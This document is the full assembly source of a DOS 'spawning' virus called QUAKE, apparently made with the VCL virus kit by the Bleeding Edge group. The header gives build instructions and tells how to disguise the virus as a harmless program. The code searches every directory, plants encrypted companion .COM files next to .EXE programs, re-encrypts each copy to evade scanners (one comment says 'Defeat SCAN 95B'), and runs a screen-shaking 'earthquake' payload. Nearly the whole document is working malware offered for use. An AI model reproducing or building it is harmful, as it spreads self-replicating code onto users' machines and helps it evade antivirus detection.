; -----------------------------------------------------------------------------
; QUAKE.ASM
; Created with Nowhere Man's Virus Creation Laboratory v1.00
;
; Heavily modified VCL and Original Code by the best Bleeding Edge virus
; writer: Night Breeze.  See you all in fuckin' HELL!
;
; This is a "spawning" virus and, technically, a trojan horse.  First time it
; is run, it will do the earthquake thing - but only after infecting another
; file first!  When the infected file is executed (in it's directory) then it
; will infect another file and run the app.  Then, when all files on that drive
; are infected, it will again do the earthquake thing!
;
; Build instructions:
;
;        Assemble QUAKE.ASM to QUAKE.COM
;           d:\tasm\tasm /mx /m2 /q /t quake
;           link quake;
;           exe2bin quake.exe quake.com
;
;        Run QUAKE.COM and file the infected file...<g>
;           Find file
;           ATTRIB *.COM -r -h
;
;        Get a copy of that file as it is encrypted...
;           COPY filename.COM \mydir\TEMP.COM
;
;        Compile QINJECT.PAS
;
;        Cat the two files:
;           COPY /b TEMP.COM+QINJECT.EXE QUAKE.EXE  (i know, overwrites)
;
; Now, QINJECT actually as the same strings (most) as QUAKE.COM, so if the
; user types or debugs the program, will see the strings.  The REAL virus
; is hidden, and encrypted, at the start of QUAKE.EXE (it's really a com file).
;
; NOTE: The flag SHOW_FLAG is used to allow an intial infection, then to all
; the victim to see an apparently good program - although he is getting
; fucked :)
;
;
; If all that was too hard... just distribute the enclosed EARTH.EXE program:)
;
; -----------------------------------------------------------------------------
code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

start           label   near

; -----------------------------------------------------------------------------
main            proc    near
		call    encrypt_decrypt         ; Decrypt the virus

start_of_code   label   near

                inc     Show_Flag               ; Inc infect count

		mov     si, offset spawn_name   ; Save a copy of the
		mov     di, offset save_name    ;   file to "spawn"
		cld
		mov     cx, 14                  ; It's allways 14 bytes
	rep     movsb

		call    search_files            ; Find and infect a file

		mov     al,byte ptr [set_carry] ; AX holds ALL INFECTED value
		cmp     al, 0                   ; Have we infected all files?
		jz      Effect                  ; If so, then do it!

                cmp     Show_Flag,3             ; Should we show display?
                jl      Effect
                jmp     short end00
Effect:
		call    EarthQuake              ; Let's do it!
                jmp     short Finito            ; And don't run app!
end00:
		mov     ah,04Ah                 ; DOS resize memory function
		mov     bx,(finish - start) / 16 + 0272h  ; BX holds # of para.
		int     021h

		mov     sp,(finish - start) + 01100h  ; Change top of stack

		mov     si,offset save_name     ; SI points to true filename
		int     02Eh                    ; DOS execution back-door
Finito:
		mov     ah,04Ch                 ; DOS terminate function
		int     021h
main            endp

; -----------------------------------------------------------------------------
search_files    proc    near
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,64                   ; Allocate 64 bytes on stack

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 64]            ; SI points to 64-byte buffer
		int     021h

		mov     ah,03Bh                 ; DOS change directory function
		mov     dx,offset root          ; DX points to root directory
		int     021h

		call    traverse                ; Start the traversal

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 64]            ; DX points to old directory
		int     021h

		mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

; -----------------------------------------------------------------------------
traverse        proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first function
		mov     cx,00010000b            ; CX holds search attributes
		mov     dx,offset all_files     ; DX points to "*.*"
		int     021h
		jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
		jne     another_dir             ; If not, try again
		cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
		je      another_dir             ;If so, keep going

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 98]            ; DX points to new directory
		int     021h

		call    traverse                ; Recursively call ourself

		pushf                           ; Save the flags
		mov     ah,03Bh                 ; DOS change directory function
		mov     dx,offset up_dir        ; DX points to parent directory
		int     021h
		popf                            ; Restore the flags

		jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
		int     021h
		jnc     check_dir               ; If found check the file

leave_traverse:
		mov     dx,offset exe_mask      ; DX points to "*.EXE"
		call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller

up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
exe_mask        db      "*.EXE",0               ; Mask for all .EXE files
traverse        endp

; -----------------------------------------------------------------------------
find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx, 00100111b           ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

; -----------------------------------------------------------------------------
infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     di,bx                   ; DI points to the DTA

		lea     si,[di + 01Eh]          ; SI points to file name
		mov     dx,si                   ; DX points to file name, too
		mov     di,offset spawn_name + 1; DI points to new name
		xor     ah,ah                   ; AH holds character count
transfer_loop:  lodsb                           ; Load a character
		or      al,al                   ; Is it a NULL?
		je      transfer_end            ; If so then leave the loop
		inc     ah                      ; Add one to the character count
		stosb                           ; Save the byte in the buffer
		jmp     short transfer_loop     ; Repeat the loop
transfer_end:
                mov     byte ptr [spawn_name],ah; First byte holds char. count
		mov     byte ptr [di],13        ; Make CR the final character

		mov     di,dx                   ; DI points to file name
		xor     ch,ch                   ;
		mov     cl,ah                   ; CX holds length of filename
		mov     al,'.'                  ; AL holds char. to search for
	repne   scasb                           ; Search for a dot in the name
		mov     word ptr [di],'OC'      ; Store "CO" as first two bytes
		mov     byte ptr [di + 2],'M'   ; Store "M" to make "COM"

		mov     byte ptr [set_carry],0  ; Assume we'll fail
		mov     ax,03D00h               ; DOS open file function, r/o
		int     021h
		jnc     infection_done          ; File already exists, so leave
		mov     byte ptr [set_carry],1  ; Success -- the file is OK

		mov     ah,03Ch                 ; DOS create file function
		mov     cx, 00100011b           ; CX holds file attributes
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		call    encrypt_code            ; Write an encrypted copy

		mov     ah,03Eh                 ; DOS close file function
		int     021h

infection_done: cmp     byte ptr [set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

; -----------------------------------------------------------------------------
spawn_name      db      0, 12 dup (?),13     ; Name for next spawn
save_name       db      0, 12 dup (?),13     ; Name for current spawn
show_flag       db      0                    ; When 0 & 1 then show display
set_carry       db      ?                    ; Set-carry-on-exit flag
infect_file     endp

; =============================================================================
EarthQuake      proc    near
                call InitCrt       ; Initialize the vars

                call DrawFrame     ; Draw a frame in middle of screen

                mov  cx, 2         ; Make some noise
                call Siren

                mov  si, OFFSET Warning  ; Put Msg 1
                mov  dx,0718h            ; Move to Row 8, column 20
                call WriteStr

                mov  cx, 1
                call Siren

                mov  si, OFFSET ToHills   ; Put Msg 2
                mov  dx,0A16h             ; Move to Row 10, column 18
                call WriteStr

                mov  cx, 2               ; More noise
                call Siren

                call Shake               ; Shake the screen - it's a quake!

                call DrawFrame     ; Draw a frame in middle of screen

                mov  si, OFFSET MadeIt  ; Put Made It Msg
                mov  dx,081Fh
                call WriteStr

                cmp  Show_Flag, 3
                jl   EarthDone
                mov  si, OFFSET BurmaShave  ; Put Logo
                mov  dx,0C36h
                call WriteStr
      EarthDone:
                ret
EarthQuake      endp

Warning         db  '* * * Earthquake Warning! * * *', 0
ToHills         db  'Head for the hills!  Take cover!!!', 0
MadeIt          db  'Whew!  We Made It!', 0
BurmaShave      db  '-=[VCL/BEv]=-', 0

Table struc        ; Structure of the Shaker Table
   Iters    db  0      ; Number of interations (quakes)
   Cols     db  0      ; Scroll number of columns
   Pause    dw  0      ; And then wait this much time
Table ends

QuakeTable      Table < 3,  1, 500>
                Table < 4,  2, 250>
                Table < 5,  3, 175>
                Table < 6,  4, 100>
                Table <10,  5,  30>
                Table <20,  5,  10>
                Table <10,  5,  30>
                Table < 5,  4, 100>
                Table < 4,  3, 175>
                Table < 3,  2, 250>
                Table < 2,  1, 500>
                Table < 0,  0,   0>       ; End of data

; -----------------------------------------------------------------------------
Shake           proc    near
                mov  si, OFFSET QuakeTable   ; Get pointer to table
                xor  cx,cx
   ShakeNext:
                mov  cl, [si].Iters
                jcxz ShakeDone
   ShakeInner:
                push cx                  ; Save for later
                push si                  ; ditto

                xor  ax,ax               ; duh...
                mov  al, [si].Cols       ; Number of columns to scroll
                push ax                  ; Get Ready
                call ScrollRight         ; Go...Scroll Screen to right
                pop  si                  ; Restore it

                cmp  [si].Cols, 3        ; Check if we are scrolling more than 3
                jle  ShakeCont1          ; If less or equal then skip vert scroll
                mov  ah, 6               ; Scroll up 1 line
                call Scroll              ; Do it.
   ShakeCont1:
                mov  cx, [si].Pause      ; delay period
                call Delay               ; Wait around a bit

                push si                  ; And save our table index for l8r
                xor  ax,ax               ; duh...
                mov  al, [si].Cols       ; Number of columns to scroll
                push ax                  ; Get Ready...Set...
                call ScrollLeft          ; Go! ... Scroll screen left
                pop  si                  ; And restore our table index

                cmp  [si].Cols, 3        ; Check if we are scrolling more than 3
                jle  ShakeCont2          ; If less or equal then skip vert scroll
                mov  ah, 7               ; Scroll up 1 line
                call Scroll              ; Do it.
   ShakeCont2:
                mov  cx, [si].Pause      ; pause again
                call Delay               ; Do it.

                pop  cx                  ; Get back our iteration counter
                Loop ShakeInner          ; Keep going
                add  si, 4               ; Move to next table element
                jmp  short ShakeNext     ; Keep on doing it...
  ShakeDone:
                ret
Shake           endp

; -----------------------------------------------------------------------------
; in: cx = number of times to do the siren
Siren           proc    near
     KeepGoing:
                push cx                ; Save the count
                mov  ax, 880           ; Freq
                mov  bx, 500           ; Duration = 1/2 second
                push ax                ; Put Freq on stack
                push bx                ; Put Duration on stack
                call Beep              ; Make a noise
                mov  ax, 660           ; Freq
                mov  bx, 500           ; Duration = 1/5 second
                push ax                ; Put Freq on stack
                push bx                ; Put Duration on stack
                call Beep              ; Make more noise
                pop  cx                ; Restore the count
                loop KeepGoing         ; So we can keep going
                ret
Siren           endp

; -----------------------------------------------------------------------------
; ds:si points to the null terminated string to print
; dx    has row/col -  dh=row
WriteStr        proc    near
                mov bh,0                ; We'll be working on page 0
     WriteMore:
                mov  al,[si]            ; get the next character to print
                cmp  al, 0              ; done yet?
                jz   WriteDone          ; Yep, so quit
                inc  si                 ; si++
                mov  ah,2               ; locate cursor at dx
                int  10h                ; do it
                push cx                 ; save it for later
                mov  cx,1               ; count of characters to write!
                mov  ah,10              ; subfunction 10
                int  10h                ; call bios to do our dirty work
                pop  cx                 ; get it back
                inc  dx                 ; move to next cursor position
                jmp short WriteMore     ; keep going for cx
     WriteDone:
                ret
WriteStr        endp

; -----------------------------------------------------------------------------
DrawFrame       proc    near
                push bp             ; Work around a stoopid bug in PC/XTs
                mov  ax, 0600h      ; Draw and clear the outer frame
                push ax             ; Save for later
                mov  cx, 050Ah      ; Upper screen coords: CH = ROW
                mov  dx, 0D46h      ; Lower bounds, DH = ROW
                mov  bh, 70h        ; Color is White Background, Black fore
                int  10h            ; Do It.

                pop  ax             ; Draw and clear the inner frame
                mov  cx, 060Ch      ; Upper screen coords: CH = ROW
                mov  dx, 0C44h      ; Lower bounds, DH = ROW
                mov  bh, 0Eh        ; Color is Black Background, Yellow fore
                int  10h            ; Do It Again
                pop  bp             ; End of stoopid fix
                ret
DrawFrame       endp

; =============================================================================
ScrollRight     proc    near
                push  bp
                mov   bp, sp
                mov   ax, [bp+4]      ; calc ColsToMove <- LEN shl 1
                shl   ax, 1           ; multiply by 2
                mov   ColsToMove, ax  ; And save it
                mov   bx, NumCols     ; calc WordsToScroll <- NumCols - LEN
                sub   bx, ax          ; adjust for scroll difference
                inc   bx              ; BX = WordsToScroll
                mov   ax, VidSegment  ; Put ES = Video Segment
                mov   es, ax
                xor   ax, ax          ; Start on row 0 aka 1
  sr_NextRow:
                push  ax              ; Save for later
                mul   LineWidth       ; AX now has ROW * LineWidth
                push  ax              ; Save start of row offset for printing
                add   ax, LineWidth   ; AX points to last byte of the row
                sub   ax, ColsToMove  ; This moves back 1 LEN of ch/attr pairs
                mov   di, ax          ; save in DEST
                sub   ax, ColsToMove  ; AX now moves back another LEN pairs
                mov   si, ax          ; save in SOURCE
                mov   cx, bx          ; BX = Words to Scroll
                push  ds              ; Stash this
                push  es              ; Make DS = ES
                pop   ds              ; Like this
                std                   ; Set SI and DI to decrement
                rep   movsw
                pop   ds              ; Get the DS back
                pop   di              ; Grab the Source Offset we saved above
                mov   cx, [bp+4]      ; Prepare to print LEN blanks
                call  PrintBlank
                pop   ax              ; Saved row
                inc   ax              ; Move to next row
                cmp   ax, 25          ; Done with all rows?
                jne   sr_NextRow      ; No?  Then do next row!

                mov   sp, bp
                pop   bp
                ret   2
ScrollRight     endp

; -----------------------------------------------------------------------------
ScrollLeft      proc    near
                push  bp
                mov   bp, sp
                mov ax, [bp+4]      ; calc  ColsToMove := Len Shl 1
                shl ax, 1
                mov ColsToMove, ax
                mov bx, NumCols     ; calc WordsToScroll := pred(NumCols) shl 1
                mov ax, VidSegment  ; Make ES point to the video segment
                mov es, ax

                mov es, ax
                xor ax, ax          ; Start on row 0 aka 1
  sl_NextRow:
                push ax             ; Save Row for later
                mul  LineWidth      ; calc AX := Row * LineWidth
                push ax             ; Save Start of Line
                mov  di, ax         ; This is where it's going
                add  ax, ColsToMove ; calc AX := AX + ColsToMove
                mov  si, ax         ; This will be our source
                push ds             ; Stash for later ...
                push es             ; Make DS = ES = Video Segment
                pop  ds
                mov  cx, bx         ; BX = Words To Scroll
                cld                 ; Set SI and DI to decrement
                rep movsw
                pop  ds             ; Get our DS back...

                pop  di             ; Grab the Source Offset we saved
                add  di, LineWidth
                sub  di, colsToMove
                mov  cx, [bp+4]     ; Prepare to print some blanks
                call PrintBlank     ; Do It

                pop  ax             ; Get back out row value
                inc  ax             ; And move to next row
                cmp  ax, 25         ; first check if we are done
                jne  sl_NextRow     ; If now, then do next row

                mov   sp, bp
                pop   bp
                ret   2
ScrollLeft      endp

; -----------------------------------------------------------------------------
; In  AH = 6  scroll up
;        = 7  scroll down
Scroll          proc    near
                mov  al, 1           ; We will always scroll 1 line
                xor  cx, cx          ; Set Top Row/Col to (0,0)
                mov  dx, 184Fh       ; Set Bottom Row/Col to (24,79)
                mov  bh, 07h         ; Use a normal blank
                push bp              ; Work around a lame bug on PC/XTs
                int  10h             ; Do Bios...Oh Do Me Now
                pop  bp              ; And continue fixing that st00pid bug
                ret                  ; I really feel sill doc'g this routine...
Scroll          endp

; -----------------------------------------------------------------------------
PrintBlank      proc    near
; In  ES - Video Segment
;     DI - Offset to print blank at
;     CX - Number of blanks to print
                cld                     ; store forward (increment DI)
                mov al,' '              ; We want to print a blank
PrintAgain:
                stosb                   ; put in one blank char
                inc  di                 ; skip video attribute
                loop short PrintAgain
                ret
PrintBlank      endp

; -----------------------------------------------------------------------------
; All the routines dealing with Sound and Delays - especially the delay
; calibration routine were mostly stolen from Kim Kokkonen's code in earlier
; version of Turbo Professional.  KK is the owner of Turbo Power - a damn good
; set of programming tools - plug plug!
; Beep(Hz, MS:Word); assembler;
Beep            proc   near
                push  bp
                mov   bp, sp
                mov   bx, [bp+6]   ; hertz
                mov   AX,34DDH
                mov   DX,0012H
                cmp   DX,BX
                jnc   beepStop
                div   BX
                mov   BX,AX          ; Lots of port tweaking... Isn't
                in    AL,61H           ; this shit fun???
                test  AL,3
                jnz   @99
                or    AL,3
                out   61H,AL
                mov   AL,0B6H
                out   43H,AL
 @99:
                mov   AL,BL          ; I know I never get bored.!!
                out   42H,AL
                mov   AL,BH
                out   42H,AL
 BeepStop:
                mov   CX, [bp+4]    ; push ms delay time
                call  Delay    ; and wait...

                IN    AL, 61h  ; Now turn off the speaker
                AND   AL, 0FCh
                out   061h, AL
                mov   sp, bp
                pop   bp
                ret   4
Beep            endp

; -----------------------------------------------------------------------------
; In: cx = delay in ms
Delay           proc   near
        delay1:                     ; What's to say... a tight loop
                call  delayOneMS    ; counting milliseconds
                loop  short delay1
                ret
Delay           endp

; =============================================================================
DelayOneMS      proc   near
                push cx         ; Save CX
                mov  cx, OneMS  ; Loop count into CX
  DelayOne1:
                loop delayOne1  ; Wait one millisecond
                pop  cx         ; Restore CX
                ret
DelayOneMs      endp

; -----------------------------------------------------------------------------
Calibrate_Delay proc    near
                mov  ax,40h
                mov  es,ax
                mov  di,6Ch      ; ES:DI is the low word of BIOS timer count
                mov  OneMS, 55   ; Initial value for One MS's time
                xor  dx,dx       ; DX = 0
                mov  ax,es:[di]  ; AX = low word of timer
  CalKeepOn:
                cmp  ax,es:[di]  ; Keep looking at low word of timer
                je   CalKeepOn   ; until its value changes...
                mov  ax,es:[di]  ; ...then save it
  CalDoMore:
                call DelayOneMs  ; Delay for a count of OneMS (55)
                inc  dx          ; Increment loop counter
                cmp  ax,es:[di]  ; Keep looping until the low word...
                je   CalDoMore   ; ...of the timer count changes again
                mov  OneMS, dx   ; DX has new OneMS }
                ret
Calibrate_Delay endp

; -----------------------------------------------------------------------------
InitCrt         proc    near
                mov  ah,15             ; Get Video Mode
                int  10h
                cmp  al, 7             ; Check if this is monochrome
                je   DoneInit
                add  VidSegment, 800h
DoneInit:
                mov  byte ptr NumCols, ah   ; Set the number of Character Cols
                shl  ah, 1                  ; Mult by two for number of vid bytes
                mov  byte ptr LineWidth, ah ; And stash it...
ToneInit:
                call Calibrate_Delay
                ret
InitCrt         endp

; =============================================================================
VidSegment      dw  0B000h         ; Base Video Segment
NumCols         dw  ?              ; Columns on Screen
LineWidth       dw  ?              ; NumCols * 2
ColsToMove      dw  ?              ; Number of video bytes to move each time
OneMS           dw  ?              ; Calibration value for 1 ms of time

; =============================================================================
encrypt_code    proc    near
		mov     si,offset encrypt_decrypt; SI points to cipher routine

		xor     ah,ah                   ; BIOS get time function
		int     01Ah
		mov     word ptr [si + 9],dx    ; Low word of timer is new key

		xor     byte ptr [si],1         ;
		xor     byte ptr [si + 8],1     ; Change all SIs to DIs
		xor     word ptr [si + 11],0101h; (and vice-versa)

		mov     di,offset finish        ; Copy routine into heap
		mov     cx,finish - encrypt_decrypt - 1  ; All but final RET
		push    si                      ; Save SI for later
		push    cx                      ; Save CX for later
	rep     movsb                           ; Copy the bytes

		mov     si,offset write_stuff   ; SI points to write stuff
		mov     cx,5                    ; CX holds length of write
	rep     movsb                           ; Copy the bytes

		pop     cx                      ; Restore CX
		pop     si                      ; Restore SI
		inc     cx                      ; Copy the RET also this time
	rep     movsb                           ; Copy the routine again

		mov     ah,040h                 ; DOS write to file function
		mov     dx,offset start         ; DX points to virus

		call    finish                  ; Encrypt/write/decrypt

		ret                             ; Return to caller

write_stuff:    mov     cx,finish - start       ; Length of code
		int     021h
encrypt_code    endp

end_of_code     label   near

; -----------------------------------------------------------------------------
encrypt_decrypt proc    near
		mov     si,offset start_of_code ; SI points to code to decrypt
                nop                             ; Defeat SCAN 95B
		mov     cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:       db      081h,034h,00h,00h       ; XOR a word by the key
		inc     si                      ; Do the next word
		inc     si                      ;
		loop    xor_loop                ; Loop until we're through
		ret                             ; Return to caller
encrypt_decrypt endp

finish          label   near

code            ends
		end     main
